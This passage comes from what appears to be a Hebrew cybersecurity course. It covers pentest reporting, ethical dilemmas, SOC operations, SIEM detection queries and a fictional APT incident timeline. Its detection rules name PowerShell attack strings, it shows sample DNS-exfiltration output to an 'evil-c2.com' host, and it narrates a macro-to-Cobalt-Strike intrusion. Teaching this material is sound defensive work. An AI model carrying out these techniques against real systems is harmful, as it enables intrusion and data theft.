<p>ל-CEO ול-Board. בלי טכנולוגיה. שורה תחתונה:</p>
<div class="code-preview"><pre><code>"הצלחנו להגיע לשליטה מלאה ב-Domain Controller
 תוך 5 ימים, ללא ידע מוקדם.
 נמצאו 3 ממצאים קריטיים ו-7 ברמת High.
 סיכון עסקי: גבוה מאוד."</code></pre></div>

<p><strong>2. Technical Findings (הגוף)</strong></p>
<p>כל ממצא כולל:</p>
<table class="content-table">
  <tr><th>שדה</th><th>דוגמה</th></tr>
  <tr><td><code>Title</code></td><td>Unpatched Citrix Gateway — CVE-2023-3519</td></tr>
  <tr><td><code>Severity</code></td><td>Critical (CVSS 9.8)</td></tr>
  <tr><td><code>Description</code></td><td>Citrix ADC 13.0-58.32 vulnerable to RCE</td></tr>
  <tr><td><code>Impact</code></td><td>Full system compromise, network pivot</td></tr>
  <tr><td><code>Evidence</code></td><td>Screenshots, commands, timestamps</td></tr>
  <tr><td><code>Remediation</code></td><td>Update to 13.1-49.15+, restrict access</td></tr>
  <tr><td><code>Priority</code></td><td>Immediate — exploit in the wild</td></tr>
</table>

<p><strong>3. Attack Narrative (הסיפור)</strong></p>
<p>תיאור כרונולוגי: "ביום 1 גילינו X, ביום 3 ניצלנו Y..." — עוזר ללקוח להבין את ה-<code>kill chain</code>.</p>

<p><strong>4. Remediation Roadmap</strong></p>
<p>תוכנית תיקון מתועדפת:</p>
<ul>
<li><strong>מיידי (0-48 שעות):</strong> Patch Citrix, rotate svc_backup password</li>
<li><strong>קצר טווח (1-2 שבועות):</strong> Network segmentation, disable LLMNR</li>
<li><strong>ארוך טווח (1-3 חודשים):</strong> PAM solution, phishing training, SOC setup</li>
</ul>

<div class="mini-cards">
<div class="mini-card"><div class="mini-card-icon">📊</div><div class="mini-card-title">Executive Summary</div><div class="mini-card-desc">חצי עמוד ל-CEO — שורה תחתונה, סיכון עסקי, ללא טכנולוגיה</div></div>
<div class="mini-card"><div class="mini-card-icon">🔍</div><div class="mini-card-title">Technical Findings</div><div class="mini-card-desc">כל ממצא: Title, Severity, Evidence, Remediation</div></div>
<div class="mini-card"><div class="mini-card-icon">📖</div><div class="mini-card-title">Attack Narrative</div><div class="mini-card-desc">סיפור כרונולוגי — איך פרצנו, שלב אחר שלב</div></div>
<div class="mini-card"><div class="mini-card-icon">🛠️</div><div class="mini-card-title">Remediation Roadmap</div><div class="mini-card-desc">תוכנית תיקון: מיידי, קצר טווח, ארוך טווח</div></div>
</div>

<div class="success-box"><strong>✅ טיפ לדוח מוצלח:</strong> כתוב סיפור, לא רשימת CVEs. הנהלה מבינה "נכנסנו דרך phishing תוך 4 ימים" — לא "CVE-2023-3519 CVSS 9.8". תמיד כלול screenshots ו-timestamps.</div>

<div class="key-point"><strong>💡 עצת זהב:</strong> דוח טוב מספר סיפור. לא רשימת CVEs — סיפור של "איך פרצנו". הנהלה מבינה סיפורים. הנהלה לא מבינה CVSS scores.</div>

<div class="chapter-summary"><h4>📋 סיכום פרק 104</h4><ul>
<li><strong>5 שלבי Pentest:</strong> Recon → Scanning → Exploitation → Post-Exploitation → Reporting</li>
<li><strong>Rules of Engagement</strong> — חוזה חובה: Scope, Out of Scope, Emergency Stop, Data Handling</li>
<li><strong>סוגי מבדקים:</strong> White Box (מלא), Black Box (עיוור), Gray Box (חלקי — הנפוץ ביותר)</li>
<li><strong>הדוח הוא המוצר</strong> — Executive Summary + Technical Findings + Attack Narrative + Remediation</li>
</ul></div>
</div>`
      },
      {
        type: "thinkOutside",
        title: "חשיבה מחוץ לקופסא – דילמות אתיות ב-Pentesting",
        intro: "<p>Pentesting חי על הגבול בין חוקי לבלתי חוקי. הנה כמה דילמות שכל pentester מתמודד איתן...</p>",
        blocks: [
          {
            title: "מצאת גישה לנתוני לקוחות אמיתיים",
            icon: "🔓",
            content: "ה-scope אומר 'הוכח גישה ל-DB'. פתחת את ה-DB וראית רשומות אמיתיות — שמות, SSN, כרטיסי אשראי. ה-Rules of Engagement אומרים 'צלם screenshot כהוכחה'. אבל ברגע שצילמת — יש לך PII על המחשב שלך. מה עושים? הפתרון המקובל: צילום של COUNT(*) או שורה עם נתונים מטושטשים. אבל לא כל החוזים מפרטים את זה."
          },
          {
            title: "מצאת פריצה שלא קשורה ל-scope",
            icon: "🚨",
            content: "תוך כדי Pentest על שרת Web, גילית שמישהו אחר — תוקף אמיתי — כבר בפנים. יש backdoor. יש exfiltration. מה עושים? עוצרים את ה-pentest ומדווחים? ממשיכים ומתעדים? אם תמשיך — יכול להיות שתרמוס על ראיות. אם תעצור — יכול להיות שהתוקף ימשיך. רוב ה-RoE כוללים סעיף 'critical finding escalation' — מדווחים מיד לאיש הקשר."
          },
          {
            title: "Social Engineering — איפה הגבול?",
            icon: "🎭",
            content: "שלחת phishing email לעובדת בחשבונאות. היא לחצה, ונתנה לך credentials. עכשיו היא בהיסטריה — בטוחה שהיא תפוטר. ה-RoE אומר שמותר phishing, אבל לא אמר לך שאנשים יבכו. Pentest טוב כולל הדרכה אחרי — מסבירים שזה לגיטימי, שאף אחד לא מפוטר, ושהמטרה היא לשפר. בלי הבהרה הזו — אתה פוגע באנשים."
          },
          {
            title: "הדילמה הגדולה: Responsible Disclosure",
            icon: "⚖️",
            content: "מצאת zero-day בתוכנה פופולרית. מה עושים? (א) מדווח ליצרן — שלוקח 90 ימים לתקן. באותו זמן, מיליוני משתמשים חשופים. (ב) מפרסם publicly — מכריח את היצרן לתקן מהר, אבל גם נותן לתוקפים exploit מוכן. (ג) מוכר ל-Zerodium ב-$2M — ומי שקונה הוא ממשלה שמנצלת את זה. אין תשובה פשוטה. Google Project Zero נותנים 90 ימים ואז מפרסמים — גם אם היצרן לא תיקן."
          }
        ]
      }
    ]
  },

  // ========== CHAPTER 105: Blue Team & SOC ==========
  {
    id: 105,
    title: "Blue Team ו־SOC",
    pages: [
      {
        type: "story",
        title: "3 בלילה — Alert שמשנה הכל",
        content: `<div dir="rtl">
<div class="scenario-box scenario-alert">
<p><strong>תרחיש:</strong> 03:17 AM. אנליסטית SOC במשמרת לילה רואה 2,147 שאילתות LDAP בדקה מתחנה של עובד שנמצא בחופשה בתאילנד. זה לא false positive.</p>
</div>

<p><strong>03:17 AM. מרכז ה-SOC של חברת ביטוח בהרצליה.</strong></p>

<p>שרון, אנליסטית <code>SOC</code> L2 במשמרת לילה, מביטה במסך עם כוס קפה שכבר התקררה. רוב הלילה היה שקט. התראות שגרתיות — <code>false positives</code>, סריקות פורטים אוטומטיות, ניסיונות <code>brute force</code> על VPN שנחסמו אוטומטית.</p>

<p>ואז מופיעה התראה אדומה ב-<code>Splunk</code>:</p>
<div class="code-preview"><pre><code>ALERT [HIGH] Unusual LDAP Query Volume
Source: WS-0342 (workstation)
User: david.levy (Financial Analyst)
LDAP queries last 60s: 2,147
Normal baseline: 0-5
First seen: 03:12:04 UTC</code></pre></div>

<p>הלב שלה מתחיל לדפוק. 2,000+ שאילתות <code>LDAP</code> מתחנת עבודה של אנליסט פיננסי? בשלוש בלילה?</p>

<p><strong>10 הדקות הראשונות — Triage:</strong></p>
<ul>
<li>בדיקה ב-HR: דוד לוי — <strong>בחופשה בתאילנד</strong>. לא אמור להיות מחובר</li>
<li><code>Login events</code>: WS-0342 התחברה ב-02:50 — עם ה-credentials של דוד</li>
<li>כתובת ה-IP של ההתחברות: <strong>94.x.x.x</strong> — בדיקה ב-<code>VirusTotal</code>: "Known C2 server, APT28 infrastructure"</li>
</ul>

<p>שרון מרגישה את האדרנלין עולה. זו לא false positive. זה <code>APT</code>.</p>

<p><strong>20 דקות — Containment:</strong></p>
<ul>
<li>ניתוק WS-0342 מהרשת (EDR remote isolation)</li>
<li>נעילת חשבון david.levy ב-<code>Active Directory</code></li>
<li><code>Forensic image</code> של הדיסק — לפני שנוגעים בכלום</li>
<li>הודעה ל-CISO ומנהל ה-SOC</li>
</ul>

<p><strong>Investigation (השעות הבאות):</strong></p>
<p>הנוזקה הותקנה <strong>3 שבועות קודם</strong> דרך מייל <code>phishing</code> עם מסמך Word שהכיל <code>macro</code>. במשך 3 שבועות, התוקף ביצע <code>LDAP enumeration</code> בקצב נמוך שלא הפעיל alerts. הלילה — הוא הגביר קצב, כנראה בהכנה ל-<code>Lateral Movement</code> ל-<code>Domain Controller</code>.</p>

<div class="incident-timeline">
<div class="timeline-event"><div class="timeline-dot dot-red"></div><div class="timeline-time">03:12</div><div class="timeline-desc">LDAP enumeration מתחיל — 2,147 שאילתות בדקה מ-WS-0342</div></div>
<div class="timeline-event"><div class="timeline-dot dot-gold"></div><div class="timeline-time">03:17</div><div class="timeline-desc">Alert ב-Splunk — שרון מזהה חריגה ומתחילה Triage</div></div>
<div class="timeline-event"><div class="timeline-dot dot-gold"></div><div class="timeline-time">03:20</div><div class="timeline-desc">בדיקה: העובד בחופשה, IP מקור = C2 server ידוע (APT28)</div></div>
<div class="timeline-event"><div class="timeline-dot dot-green"></div><div class="timeline-time">03:27</div><div class="timeline-desc">Containment: ניתוק WS-0342, נעילת חשבון, forensic image</div></div>
<div class="timeline-event"><div class="timeline-dot dot-green"></div><div class="timeline-time">03:35</div><div class="timeline-desc">הודעה ל-CISO ומנהל SOC — צוות IR מופעל</div></div>
</div>

<div class="key-point"><strong>💡 מה הציל את הארגון:</strong> חוק <code>SIEM</code> פשוט שמונה שאילתות LDAP חריגות. ה-<code>Detection</code> תפס את מה שה-<code>Prevention</code> (אנטי-וירוס, firewall) פספס. שרון תפסה את זה כי היא ידעה מה "נורמלי" — ו-2,147 שאילתות LDAP בדקה זה לא נורמלי.</div>
</div>`
      },
      {
        type: "explanation",
        title: "Defense in Depth — הטירה המבוצרת",
        content: `<div dir="rtl">
<p><strong>בימי הביניים, טירות לא הסתמכו על חומה אחת. היו 7 שכבות הגנה.</strong></p>
<p>אותו עיקרון בדיוק חל על אבטחת מידע:</p>

<div class="diagram-container">
<svg direction="ltr" viewBox="0 0 400 200" class="content-diagram">
  <text x="200" y="20" text-anchor="middle" font-size="12" fill="#e2e8f0" font-weight="bold">Defense in Depth — 7 שכבות</text>

  <ellipse cx="200" cy="145" rx="185" ry="48" fill="none" stroke="#475569" stroke-width="1"/>
  <text x="200" y="185" text-anchor="middle" font-size="8" fill="#64748b">Physical Security (guards, cameras, locks)</text>

  <ellipse cx="200" cy="138" rx="165" ry="42" fill="none" stroke="#64748b" stroke-width="1"/>
  <text x="200" y="172" text-anchor="middle" font-size="8" fill="#94a3b8">Network Perimeter (Firewall, IDS/IPS)</text>

  <ellipse cx="200" cy="130" rx="145" ry="36" fill="none" stroke="#334155" stroke-width="1.2"/>
  <text x="200" y="158" text-anchor="middle" font-size="8" fill="#94a3b8">Network Segmentation (VLANs, Micro-seg)</text>

  <ellipse cx="200" cy="120" rx="120" ry="30" fill="#0f172a" stroke="#3b82f6" stroke-width="1.5"/>
  <text x="200" y="142" text-anchor="middle" font-size="8" fill="#93c5fd">Endpoint (EDR, AV, Host Firewall)</text>

  <ellipse cx="200" cy="108" rx="95" ry="24" fill="#1e293b" stroke="#60a5fa" stroke-width="1.5"/>
  <text x="200" y="124" text-anchor="middle" font-size="8" fill="#7dd3fc">Application (WAF, Input Validation)</text>

  <ellipse cx="200" cy="95" rx="70" ry="18" fill="#1e3a5f" stroke="#818cf8" stroke-width="1.5"/>
  <text x="200" y="105" text-anchor="middle" font-size="8" fill="#a5b4fc">Data (Encryption, DLP, Backup)</text>

  <ellipse cx="200" cy="78" rx="45" ry="13" fill="#4c1d95" stroke="#a78bfa" stroke-width="2"/>
  <text x="200" y="83" text-anchor="middle" font-size="8" fill="#ddd6fe">IAM + MFA</text>
</svg>
</div>

<p><strong>הרעיון:</strong> כל שכבה מתוכננת <strong>בהנחה שהשכבה שלפניה כבר נפרצה</strong>.</p>

<table class="content-table">
  <tr><th>שכבה</th><th>מגנה מפני</th><th>דוגמה מהעולם האמיתי</th></tr>
  <tr><td><code>Firewall</code></td><td>גישה לא מורשית מבחוץ</td><td>חוסם את רוב הסריקות — אבל לא מייל phishing</td></tr>
  <tr><td><code>Segmentation</code></td><td>Lateral Movement</td><td>Target 2013 — אם היו VLANs, הנזק היה מצומצם</td></tr>
  <tr><td><code>EDR</code></td><td>נוזקות על endpoints</td><td>מזהה Cobalt Strike beacon שה-firewall לא ראה</td></tr>
  <tr><td><code>WAF</code></td><td>התקפות Web</td><td>חוסם SQLi, XSS — אבל לא IDOR</td></tr>
  <tr><td><code>Encryption</code></td><td>חשיפת נתונים</td><td>גם אם גנבו DB — הנתונים מוצפנים</td></tr>
  <tr><td><code>MFA</code></td><td>גניבת credentials</td><td>גם אם הסיסמה נגנבה — צריך גם את הטלפון</td></tr>
</table>

<div class="mini-cards">
<div class="mini-card"><div class="mini-card-icon">🏢</div><div class="mini-card-title">Physical</div><div class="mini-card-desc">שומרים, מצלמות, מנעולים, בקרת כניסה לחדרי שרתים</div></div>
<div class="mini-card"><div class="mini-card-icon">🌐</div><div class="mini-card-title">Network</div><div class="mini-card-desc">Firewall, IDS/IPS, VLANs, Micro-segmentation</div></div>
<div class="mini-card"><div class="mini-card-icon">💻</div><div class="mini-card-title">Endpoint</div><div class="mini-card-desc">EDR, Antivirus, Host Firewall, Disk Encryption</div></div>
<div class="mini-card"><div class="mini-card-icon">🛡️</div><div class="mini-card-title">Application</div><div class="mini-card-desc">WAF, Input Validation, CSP, Secure Coding</div></div>
<div class="mini-card"><div class="mini-card-icon">🔐</div><div class="mini-card-title">Data</div><div class="mini-card-desc">Encryption at rest/transit, DLP, Backup, IAM + MFA</div></div>
</div>

<div class="key-point"><strong>💡 כלל האצבע:</strong> אם שכבת הגנה אחת עוצרת 90% מהתקיפות, שתי שכבות עוצרות 99%, שלוש עוצרות 99.9%. כל שכבה מוסיפה סדר גודל של הגנה.</div>
</div>`
      },
      {
        type: "explanation",
        title: "SOC Operations — L1, L2, L3",
        content: `<div dir="rtl">
<p><strong>ה-SOC (Security Operations Center) הוא חדר המלחמה של ה-Blue Team.</strong></p>
<p>עובד 24/7/365. כל Alert עובר שרשרת של אנליסטים, כל אחד ברמת מומחיות אחרת.</p>

<div class="mini-cards">
<div class="mini-card"><div class="mini-card-icon">🟢</div><div class="mini-card-title">L1 — Triage</div><div class="mini-card-desc">מסנן false positives, עובד לפי playbooks, מעביר חשוד ל-L2</div></div>
<div class="mini-card"><div class="mini-card-icon">🟡</div><div class="mini-card-title">L2 — Incident Handler</div><div class="mini-card-desc">חקירה מעמיקה, root cause analysis, containment ראשוני</div></div>
<div class="mini-card"><div class="mini-card-icon">🔴</div><div class="mini-card-title">L3 — Threat Hunter</div><div class="mini-card-desc">ציד פרואקטיבי, Incident Response lead, forensics מעמיק</div></div>
</div>

<div style="display:flex;gap:12px;flex-wrap:wrap;margin:12px 0;">
<div class="stat-highlight"><span class="stat-number">11,000+</span><span class="stat-unit">alerts ליום ב-SOC ממוצע</span></div>
<div class="stat-highlight"><span class="stat-number">277</span><span class="stat-unit">ימים — MTTD ממוצע (IBM 2023)</span></div>
<div class="stat-highlight"><span class="stat-number">45-70%</span><span class="stat-unit">False Positive Rate</span></div>
</div>

<p><strong>L1 — Triage Analyst (מסנן)</strong></p>
<ul>
<li>המשמרת הראשונה שרואה את ההתראות</li>
<li><strong>המטרה:</strong> להבדיל בין <code>false positive</code> לאיום אמיתי</li>
<li>עובד לפי <code>playbooks</code> — נהלים מובנים: "אם Alert X, בדוק Y ו-Z"</li>
<li>אם מזהה משהו חשוד — מעביר ל-L2</li>
<li><strong>80% מהעבודה:</strong> סגירת false positives</li>
</ul>

<p><strong>L2 — Incident Handler (חוקר)</strong></p>
<ul>
<li>מקבל alerts ש-L1 סימן כחשודים</li>
<li><strong>המטרה:</strong> חקירה מעמיקה — <code>root cause</code>, <code>scope</code>, <code>impact</code></li>
<li>משתמש ב-<code>SIEM queries</code>, <code>EDR telemetry</code>, <code>threat intelligence</code></li>
<li>מבצע <code>containment</code> ראשוני — ניתוק מכשיר, חסימת IP</li>
<li>כותב <code>Incident Report</code></li>
</ul>

<p><strong>L3 — Threat Hunter / IR Lead (ציד)</strong></p>
<ul>
<li>לא מחכה ל-alerts — <strong>יוצא לצוד</strong></li>
<li><strong>Threat Hunting:</strong> חיפוש פרואקטיבי של <code>IOCs</code> ו-<code>TTPs</code> חדשים</li>
<li>מוביל <code>Incident Response</code> לאירועים גדולים</li>
<li>כותב <code>detection rules</code> חדשות ל-SIEM</li>
<li>מבצע <code>forensics</code> מעמיק — ניתוח זיכרון, דיסק, רשת</li>
</ul>

<p><strong>מדדים שה-SOC עוקב אחריהם:</strong></p>
<table class="content-table">
  <tr><th>מדד</th><th>יעד</th><th>ממוצע בתעשייה</th></tr>
  <tr><td><code>MTTD</code> (Mean Time to Detect)</td><td>< 1 שעה</td><td>277 ימים (IBM 2023)</td></tr>
  <tr><td><code>MTTR</code> (Mean Time to Respond)</td><td>< 4 שעות</td><td>70 ימים</td></tr>
  <tr><td><code>False Positive Rate</code></td><td>< 50%</td><td>45-70%</td></tr>
  <tr><td>Alerts/Day</td><td>ניתן לניהול</td><td>10,000+ (Alert Fatigue!)</td></tr>
</table>

<div class="warning-box"><strong>⚠️ Alert Fatigue:</strong> SOC ממוצע מקבל 10,000+ התראות ביום. כש-70% הם false positives — אנליסטים מתחילים להתעלם. כך Equifax פספסה את הפריצה. <code>SOAR</code> (Security Orchestration, Automation and Response) מנסה לפתור את זה באוטומציה.</div>
</div>`
      },
      {
        type: "demo",
        title: "SIEM בפעולה — Splunk ו-ELK",
        content: `<div dir="rtl">
<p><strong>ה-SIEM הוא ה"מוח" של ה-SOC. בואו נראה איך הוא נראה בפועל.</strong></p>

<div class="tool-card">
<div class="tool-card-icon">🔮</div>
<div class="tool-card-body"><strong>Splunk</strong><p>SIEM מוביל — שפת SPL לחיפוש בלוגים, dashboards, alerts אוטומטיים. מנהל petabytes של data.</p></div>
</div>
<div class="tool-card">
<div class="tool-card-icon">🦌</div>
<div class="tool-card-body"><strong>Elastic/ELK Stack</strong><p>Elasticsearch + Logstash + Kibana. קוד פתוח, KQL לחיפוש. פופולרי ב-SOCs שרוצים גמישות ועלות נמוכה.</p></div>
</div>

<p><strong>Splunk — SPL (Search Processing Language)</strong></p>
<div class="code-preview"><pre><code># חיפוש Lateral Movement — התחברויות חריגות
index=windows EventCode=4624 LogonType=3
  NOT (src_ip="127.0.0.1")
| stats count by src_ip, dest_ip, user
| where count > 10
| sort -count

# תוצאה:
# src_ip         dest_ip        user           count
# 10.10.0.42     10.10.0.1      svc_backup     847   ← חשוד!
# 10.10.0.42     10.10.0.15     svc_backup     234
# 10.10.0.100    10.10.0.22     admin          12</code></pre></div>

<div class="code-preview"><pre><code># חיפוש DNS Exfiltration — domains חריגים
index=dns
| eval domain_len=len(query)
| where domain_len > 50
| stats count by query, src_ip
| sort -count

# תוצאה:
# query                                              count
# aGVsbG8gd29ybGQ.data.evil-c2.com                   340  ← Base64 in DNS!
# bXlzZWNyZXQ.data.evil-c2.com                       287</code></pre></div>

<p><strong>Elastic/ELK — KQL (Kibana Query Language)</strong></p>
<div class="code-preview"><pre><code># חיפוש PowerShell חשוד
event.code: "4104" AND
  powershell.scriptblock.text: (
    "Invoke-Mimikatz" OR
    "Invoke-Expression" OR
    "DownloadString" OR
    "Net.WebClient"
  )

# חיפוש Process Injection
event.category: "process" AND
  process.name: "svchost.exe" AND
  process.parent.name: NOT ("services.exe")</code></pre></div>

<div class="info-box"><strong>ℹ️ SIGMA Rules:</strong> שפה אוניברסלית ל-detection rules שמתרגמת אוטומטית ל-Splunk SPL, ELK KQL, QRadar AQL ועוד. כתוב פעם אחת — פרוס בכל SIEM.</div>

<p><strong>SIGMA Rules — Detection-as-Code</strong></p>
<div class="code-preview"><pre><code># SIGMA — שפה אוניברסלית ל-detection rules
# מתרגמת אוטומטית ל-Splunk, ELK, QRadar...
title: Suspicious LDAP Enumeration
status: stable
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        CommandLine|contains:
            - 'ldapsearch'
            - 'Get-ADUser'
            - 'Get-ADGroup'
    condition: selection
level: medium
tags:
    - attack.discovery
    - attack.t1087</code></pre></div>

<div class="key-point"><strong>💡 נקודת מפתח:</strong> SIEM טוב ככל שה-<code>detection rules</code> שלו. חוקים גנריים מדי = ים של false positives. חוקים ספציפיים מדי = פספוסים. זהו איזון מתמיד.</div>
</div>`
      },
      {
        type: "explanation",
        title: "Incident Response — מסגרת NIST",
        content: `<div dir="rtl">
<p><strong><code>NIST SP 800-61</code> — המדריך הסטנדרטי ל-Incident Response.</strong></p>
<p>4 שלבים, בלופ אינסופי:</p>

<div class="attack-chain defense-chain">
<div class="attack-step"><div class="attack-step-content"><strong><span class="phase-badge phase-blue">Preparation</span></strong><p>IR Plan, Playbooks, צוות מאומן, כלים מוכנים</p></div></div>
<div class="attack-step"><div class="attack-step-content"><strong><span class="phase-badge phase-gold">Detection & Analysis</span></strong><p>זיהוי, Triage, Scoping, תיעוד כל evidence</p></div></div>
<div class="attack-step"><div class="attack-step-content"><strong><span class="phase-badge phase-red">Containment & Eradication</span></strong><p>עצירת הדימום, הסרת הגורם, שחזור מערכות</p></div></div>
<div class="attack-step"><div class="attack-step-content"><strong><span class="phase-badge phase-green">Lessons Learned</span></strong><p>Post-mortem, עדכון playbooks, הדרכת צוות</p></div></div>
</div>

<p><strong>1. <span class="phase-badge phase-blue">Preparation</span> — הכנה (לפני שקורה משהו)</strong></p>
<ul>
<li><code>IR Plan</code> מתועד ומאושר ע"י הנהלה</li>
<li><code>Playbooks</code> — נהלי טיפול לכל סוג אירוע (ransomware, phishing, data breach)</li>
<li>צוות IR מאומן — עם תפקידים ברורים</li>
<li>כלים מוכנים: <code>EDR</code>, <code>SIEM</code>, <code>forensics toolkit</code></li>
<li><strong>תרגולים!</strong> — <code>Tabletop exercises</code> רבעוניים</li>
</ul>

<p><strong>2. <span class="phase-badge phase-gold">Detection & Analysis</span> — זיהוי וניתוח</strong></p>
<ul>
<li>Alert מגיע מ-SIEM / EDR / user report</li>
<li><code>Triage</code>: האם זה אמיתי? מה החומרה?</li>
<li><code>Scoping</code>: כמה מערכות מושפעות? מה הנזק?</li>
<li>תיעוד: כל פעולה, כל timestamp, כל evidence</li>
</ul>

<p><strong>3. <span class="phase-badge phase-red">Containment, Eradication, Recovery</span></strong></p>
<table class="content-table">
  <tr><th>צעד</th><th>מה</th><th>דוגמה</th></tr>
  <tr><td><code>Short-term Containment</code></td><td>עצור את הדימום</td><td>נתק מכשיר מהרשת, חסום IP</td></tr>
  <tr><td><code>Long-term Containment</code></td><td>פתרון זמני יציב</td><td>Firewall rule, disable account</td></tr>
  <tr><td><code>Eradication</code></td><td>הסר את הגורם</td><td>מחק malware, patch vulnerability, rotate keys</td></tr>
  <tr><td><code>Recovery</code></td><td>חזור לפעולה</td><td>שחזר מ-backup, monitor closely</td></tr>
</table>

<p><strong>4. <span class="phase-badge phase-green">Lessons Learned</span> — לקחים</strong></p>
<ul>
<li><code>Post-mortem</code> meeting תוך 72 שעות</li>
<li>שאלות: מה קרה? מתי גילינו? מה עבד? מה לא?</li>
<li>עדכון <code>playbooks</code> ו-<code>detection rules</code></li>
<li>הדרכה לצוות על הטכניקות שזוהו</li>
</ul>

<div class="key-point"><strong>💡 הכלל הראשון:</strong> "Don't Panic". ברגע שמגלים אירוע — לא רצים לפרמט שרתים. קודם כל <strong>מתעדים ומשמרים ראיות</strong>. אז מכילים. אז מנקים.</div>
</div>`
      },
      {
        type: "story",
        title: "APT Detection — 3 שבועות מתחת לרדאר",
        content: `<div dir="rtl">
<p><strong>חזרה לסיפור של שרון — מה התגלה בחקירה.</strong></p>

<p>אחרי שניתקה את WS-0342 והשלימה את ה-<code>forensic image</code>, שרון ישבה עם צוות ה-IR לחקירה מעמיקה. התמונה שהתגלתה הייתה מדאיגה.</p>

<p><strong>Timeline של המתקפה:</strong></p>

<div class="incident-timeline">
<div class="timeline-event"><div class="timeline-dot dot-red"></div><div class="timeline-time">יום 1</div><div class="timeline-desc">Phishing email נפתח — Cobalt Strike beacon מותקן בזיכרון (fileless)</div></div>
<div class="timeline-event"><div class="timeline-dot dot-gold"></div><div class="timeline-time">ימים 2-14</div><div class="timeline-desc">Low & slow — beacon sleeps 4 שעות, 3-5 LDAP queries ליום (מתחת ל-threshold)</div></div>
<div class="timeline-event"><div class="timeline-dot dot-gold"></div><div class="timeline-time">ימים 15-20</div><div class="timeline-desc">מיפוי AD עם BloodHound — זיהוי נתיב ל-Domain Admin</div></div>
<div class="timeline-event"><div class="timeline-dot dot-red"></div><div class="timeline-time">יום 21 (03:12)</div><div class="timeline-desc">התוקף מגביר קצב — 2,147 LDAP queries בדקה</div></div>
<div class="timeline-event"><div class="timeline-dot dot-green"></div><div class="timeline-time">יום 21 (03:17)</div><div class="timeline-desc">SIEM Alert — שרון תופסת ומבצעת containment</div></div>
</div>

<div style="display:flex;gap:12px;flex-wrap:wrap;margin:12px 0;">
<div class="stat-highlight"><span class="stat-number">21 ימים</span><span class="stat-unit">dwell time (זמן שהייה)</span></div>
<div class="stat-highlight"><span class="stat-number">5 דקות</span><span class="stat-unit">מ-Alert ל-Containment</span></div>
<div class="stat-highlight"><span class="stat-number">0</span><span class="stat-unit">נתוני לקוחות שנגנבו</span></div>
</div>

<div class="code-preview"><pre><code>יום 1 (לפני 3 שבועות):
09:14 — david.levy פתח מייל: "Invoice_Q4_2025.docx"
09:14 — Word macro ← PowerShell ← Cobalt Strike beacon
09:15 — Beacon C2: 94.x.x.x:443 (HTTPS, encrypted)
         ← AV לא זיהה (fileless, in-memory)

יום 2-14 (שבועיים):
       — Beacon "sleeps" 4 שעות בין כל check-in
       — Low & slow: 3-5 LDAP queries ליום
       — ← מתחת ל-threshold של SIEM rules

יום 15-20:
       — התוקף ממפה AD structure עם BloodHound
       — מזהה: svc_backup → Domain Admin path
       — עדיין low & slow

יום 21 (הלילה):
03:12 — התוקף מחליט לפעול
       — 2,147 LDAP queries בדקה
       — ← SIEM ALERT! שרון תופסת.</code></pre></div>

<p><strong>מה עשה את ההבדל?</strong></p>
<p>התוקף היה סבלני — 3 שבועות. הוא ידע לעבוד מתחת ל-thresholds. אבל כשהחליט לעבור ל-<code>Lateral Movement</code>, הוא הגביר קצב — ונתפס.</p>

<p><strong>מה גילתה הפורנזיקה:</strong></p>
<ul>
<li>ה-<code>Cobalt Strike</code> beacon תקשר דרך HTTPS ל-<code>C2 server</code> — שהתחזה לאתר <code>WordPress</code> לגיטימי</li>
<li>ה-<code>macro</code> ב-Word הריץ <code>PowerShell</code> שהוריד <code>payload</code> ישירות לזיכרון — <code>fileless malware</code> — לכן האנטי-וירוס לא זיהה</li>
<li>התוקף השתמש ב-<code>living off the land</code> — כלים לגיטימיים של Windows (<code>PowerShell</code>, <code>WMI</code>, <code>certutil</code>) — קשה מאוד לזהות</li>
</ul>

<p><strong>הלקחים שיושמו:</strong></p>
<ul>
<li>חוקי SIEM חדשים עם thresholds נמוכים יותר ל-LDAP</li>
<li>EDR rule ל-<code>fileless PowerShell</code> execution</li>
<li><code>Macro blocking</code> ב-Office עבור קבצים שהגיעו ממייל</li>
<li>הדרכת <code>phishing awareness</code> לכל העובדים</li>
</ul>

<div class="key-point"><strong>💡 הנקודה:</strong> ה-CISO של חברת הביטוח אמר במפגש הלקחים: "שילמנו מיליונים על firewalls ו-EDR. מה שהציל אותנו זו אנליסטית SOC ב-3 בלילה שידעה ש-2,000 שאילתות LDAP בדקה זה לא נורמלי." הטכנולוגיה חשובה — אבל <strong>אנשים</strong> עושים את ההבדל.</div>

<div class="chapter-summary"><h4>📋 סיכום פרק 105</h4><ul>
<li><strong>Defense in Depth</strong> — 7 שכבות הגנה, כל אחת בהנחה שהקודמת נפרצה</li>
<li><strong>SOC</strong> — L1 (Triage) → L2 (Investigation) → L3 (Threat Hunting). 24/7/365</li>
<li><strong>SIEM</strong> — Splunk/ELK לזיהוי anomalies. SIGMA rules כשפה אוניברסלית</li>
<li><strong>NIST IR</strong> — 4 שלבים: Preparation → Detection → Containment → Lessons Learned</li>
<li><strong>APT</strong> — תוקפים סבלניים (שבועות/חודשים). Detection + אנשים מיומנים = ההגנה האמיתית</li>
</ul></div>
</div>`
      },
      {
        type: "thinkOutside",
        title: "חשיבה מחוץ לקופסא – אתה התוקף ואתה המגן",
        intro: "<p>הדרך הטובה ביותר להיות Blue Teamer מעולה? לחשוב כמו Red Teamer. והפוך.</p>",
        blocks: [
          {
            title: "תרגיל: תקוף את הארגון שלך",
            icon: "🎯",
            content: "קח את הארגון שאתה עובד בו (או לומד בו). שרטט את ה-network diagram. עכשיו שאל: אם הייתי תוקף, מאיפה הייתי נכנס? phishing? WiFi? supply chain? VPN ישן? בדוק: האם יש network segmentation? האם יש MFA בכל מקום? האם יש logging? אם אתה לא יודע את התשובות — גם ה-SOC שלך לא יודע."
          },
          {
            title: "Assume Breach — המנטליות החדשה",
            icon: "🧠",
            content: "המודל הישן: 'נמנע כניסה של תוקפים'. המודל החדש: 'התוקף כבר בפנים. מה עכשיו?' Zero Trust Architecture בנויה על ההנחה הזו: אל תסמוך על שום דבר — לא על הרשת הפנימית, לא על VPN, לא על הdesktop. אמת כל בקשה. תמיד. Microsoft, Google, ו-BeyondCorp — כולם עברו למודל הזה."
          },
          {
            title: "AI בהגנה — מה ישתנה?",
            icon: "🤖",
            content: "SIEM מודרניים (Sentinel, Chronicle) כבר משתמשים ב-ML לזיהוי anomalies. אבל: AI גם בצד התוקף — phishing שנכתב ע\"י LLM, deepfake voices ב-vishing, polymorphic malware שמשתנה אוטומטית. השאלה: האם AI יעזור יותר למגן או לתוקף? כרגע, נראה שהמגן מרוויח יותר — כי יש לו יותר data לאמן עליו. אבל המירוץ רק מתחיל."
